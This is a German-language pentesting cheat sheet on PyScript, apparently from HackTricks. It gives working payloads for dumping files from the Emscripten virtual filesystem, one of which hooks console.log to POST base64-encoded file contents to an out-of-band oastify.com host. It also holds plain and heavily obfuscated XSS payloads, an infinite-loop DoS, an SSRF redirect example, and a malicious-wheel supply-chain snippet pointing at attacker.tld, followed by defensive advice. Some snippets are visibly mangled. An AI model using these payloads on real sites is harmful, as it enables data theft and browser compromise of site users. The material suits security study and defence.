# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript Pentesting-Leitfaden

PyScript ist ein neues Framework, das entwickelt wurde, um Python in HTML zu integrieren, sodass es zusammen mit HTML verwendet werden kann. In diesem Cheat Sheet erfährst du, wie du PyScript für deine Pentesting-Zwecke einsetzen kannst.

### Dumping / Abrufen von Dateien aus dem virtuellen Emscripten-Speicherdateisystem:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Ergebnis:

![PyScript Pentesting Guide - Dumping / Abrufen von Dateien aus dem virtuellen Emscripten-Speicherdateisystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB-Datenexfiltration des virtuellen Emscripten-Speicherdateisystems (Überwachung der Konsole)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Ergebnis:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinary)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Ergebnis:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Ergebnis:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Code:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Ergebnis:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Endlosschleife)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Endlosschleife)

Code:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Ergebnis:

![Cross Site Scripting (JavaScript Obfuscation) - DoS-Angriff (Endlosschleife):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Neue Schwachstellen und Techniken (2023-2025)

### Server-Side Request Forgery durch unkontrollierte Weiterleitungen (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` ignoriert die Request-Parameter `redirect` und `retries`, wenn sie mit dem Browser-Transport von Pyodide verwendet werden. Wenn ein Angreifer die Ziel-URLs beeinflussen kann, folgt der Code möglicherweise domänenübergreifenden Weiterleitungen, selbst wenn urllib3 angewiesen wird, diese zu deaktivieren, wodurch SSRF-Schutzmaßnahmen ausgehebelt werden können.<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Upgrade auf `urllib3 >= 2.5.0` für Node.js, aber verlasse dich in Browsern nicht auf urllib3, um Redirects zu deaktivieren; validiere oder erlaube Ziele per Allowlist, bevor du Requests durchführst.<sup>[[4]](#references)</sup>

### Beliebiges Laden von Paketen & Supply-Chain-Angriffe

Die Pyodide-Konfiguration von PyScript akzeptiert beliebige Wheel-URLs in `packages`; wenn ein Angreifer diese Konfiguration ändern oder einschleusen kann, kann ein nachfolgender Import vom Angreifer kontrollierten Python-Code im Browser des Opfers ausführen.<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide kann pure-Python wheels von beliebigen URLs installieren, ohne dass ein WebAssembly-Build des Pakets erforderlich ist.<sup>[[6]](#references)</sup> Halte diese Konfiguration unter der Kontrolle der Entwickler, erlaube nur exakt festgelegte Paketnamen oder URLs und überprüfe die Digests der remote wheels während des Builds oder Deployments.

### Änderungen an der Output-Sanitisation (2023+)

* In der in den Legacy-Beispielen verwendeten Implementierung 2022.05.1 schreibt `print()` `text/plain`-Output ohne HTML-Escaping und ist daher anfällig für XSS.<sup>[[8]](#references)</sup>
* Der aktuelle `display()`-Helper **führt standardmäßig HTML-Escaping für einfache Strings durch**; rohes Markup muss in `pyscript.HTML()` eingeschlossen werden.<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Verwende `display()` für nicht vertrauenswürdige Eingaben und übergib keine nicht vertrauenswürdigen Zeichenfolgen an `HTML()`.<sup>[[2]](#references)</sup>

---

## Defensive Best Practices

* **Pakete auf dem neuesten Stand halten** – verwende `urllib3 >= 2.5.0` in Node.js und überprüfe Annahmen zu Browser-Weiterleitungen separat.<sup>[[4]](#references)</sup>
* **Paketquellen einschränken** – erlaube PyPI-Namen oder exakt vertrauenswürdige URLs per Allowlist und überprüfe die Digests entfernter Wheels während des Builds oder der Bereitstellung.<sup>[[5]](#references)[[6]](#references)</sup>
* **Content Security Policy härten** – verbiete inline JavaScript (`script-src 'self' 'sha256-…'`), damit injizierte `<script>`-Blöcke nicht ausgeführt werden können.
* **Vom Benutzer bereitgestellte `<py-script>`- / `<script type="py">`-Tags verbieten** – bereinige HTML auf dem Server, bevor du es an andere Benutzer zurückgibst.
* **Worker isolieren** – wenn du keinen synchronen Zugriff von Workern auf das DOM benötigst, aktiviere das Flag `sync_main_only`, um `SharedArrayBuffer` und die damit verbundenen Anforderungen an CORS-Header zu vermeiden.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [PyScript-Dokumentation zu integrierten Funktionen – `display` und `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy – Die Kunst des Verkettens von Schwachstellen (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [urllib3-Sicherheitswarnung – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [PyScript-Konfigurationsdokumentation – Pakete und `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – Pakete laden](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [PyScript-Implementierung von `pyscript.py` 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
